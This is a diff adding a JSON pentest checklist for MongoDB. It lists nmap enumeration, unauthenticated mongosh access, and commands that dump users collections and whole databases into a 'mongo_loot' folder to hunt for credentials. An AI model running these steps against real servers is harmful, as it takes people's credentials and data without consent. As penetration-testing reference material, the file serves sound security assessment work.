@@ -1,0 +1,45 @@
+{
+  "service": "MongoDB",
+  "port": 27017,
+  "categories": [
+    {
+      "category": "1. Recon & Unauthenticated Access",
+      "tasks": [
+        {
+          "id": "mongo_nmap",
+          "title": "Nmap MongoDB Info Script",
+          "description": "MongoDB has historically shipped with no authentication enabled by default, so a plain connection often just works.",
+          "commands": [
+            "nmap -sV -p 27017 --script mongodb-info,mongodb-databases {target_ip}"
+          ]
+        },
+        {
+          "id": "mongo_shell_connect",
+          "title": "Connect & List Databases",
+          "description": "Connect with the Mongo shell (or mongosh) and enumerate every database and collection you can reach.",
+          "commands": [
+            "mongosh --host {target_ip} --port 27017",
+            "show dbs",
+            "use <database_name>",
+            "show collections",
+            "db.getCollection('<collection>').find().pretty()"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Credential & Data Extraction",
+      "tasks": [
+        {
+          "id": "mongo_dump_creds",
+          "title": "Dump User Collections for Credentials",
+          "description": "Application databases frequently store a 'users' or 'accounts' collection in cleartext or weakly hashed form -- dump and grep it.",
+          "commands": [
+            "db.users.find().pretty()",
+            "mongodump --host {target_ip} --port 27017 --out ./mongo_loot"
+          ]
+        }
+      ]
+    }
+  ]
+}
